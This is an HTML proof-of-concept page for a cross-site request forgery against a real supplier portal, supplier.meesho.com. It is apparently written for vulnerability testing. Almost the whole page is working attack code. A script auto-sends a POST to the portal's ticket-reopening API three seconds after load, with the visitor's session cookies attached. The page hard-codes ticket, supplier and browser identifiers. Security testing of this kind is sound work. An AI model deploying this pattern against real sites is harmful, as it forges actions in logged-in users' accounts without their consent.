<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>CSRF PoC - Meesho Supplier Reopen Ticket</title>
  <style>
    body { font-family: Arial, sans-serif; padding: 40px; background: #f8f9fa; }
    h1   { color: #c00; }
    #status { margin-top: 20px; font-weight: bold; }
  </style>
</head>
<body>

  <h1>CSRF Proof-of-Concept: Reopen Support Ticket</h1>
  <p>This page will attempt to reopen ticket <strong>8771534437535</strong> with reason "test" if you are logged in to supplier.meesho.com in this browser.</p>
  <p><strong>After 3 seconds</strong> the request will be sent automatically.</p>

  <div id="status">Waiting...</div>

  <script>
  async function sendCSRF() {
    const payload = {
      "ticket_reopening_reason": "test",               // ← change reason if you want
      "ticket_id": 8771534437535,                      // ← your ticket ID
      "s3_attachment_urls": [],                        // empty array (no attachments)
      "supplier_id": 2784913                           // ← your supplier ID
    };

    const statusEl = document.getElementById("status");

    try {
      const response = await fetch("https://supplier.meesho.com/experienceapi/api/support/reopenTicket", {
        method: "POST",
        mode: "no-cors",                  // required for cross-origin + credentials
        credentials: "include",           // ← sends your session cookies
        cache: "no-cache",
        headers: {
          "Content-Type": "application/json;charset=UTF-8",
          "Accept": "application/json, text/plain, */*",
          "Client-Package-Version": "1.2.0",
          "Client-Type": "d-web",
          "Identifier": "qmhr5",          // ← your identifier (change if testing different account)
          "Browser-Id": "NmkgKyAyMjggKyAxNm9vMDE2b21vbw=="
          // You can add more headers if needed (Origin & Referer are set automatically by browser)
        },
        body: JSON.stringify(payload)
      });

      // We reach here only if mode != no-cors (almost never happens)
      statusEl.textContent = "Request sent (but response not readable in no-cors mode)";
      statusEl.style.color = "green";
    } catch (err) {
      // This catch is normal in no-cors mode — request was still sent
      statusEl.textContent = "Request attempted (check the panel → ticket should be reopened if vulnerable)";
      statusEl.style.color = "#006600";
    }
  }

  // Auto-execute after short delay (gives time to read the page)
  setTimeout(() => {
    document.getElementById("status").textContent = "Sending request...";
    sendCSRF();
  }, 3000);

  // Optional: manual trigger button
  // <button onclick="sendCSRF()">Re-Trigger CSRF</button>
  </script>

</body>
</html>
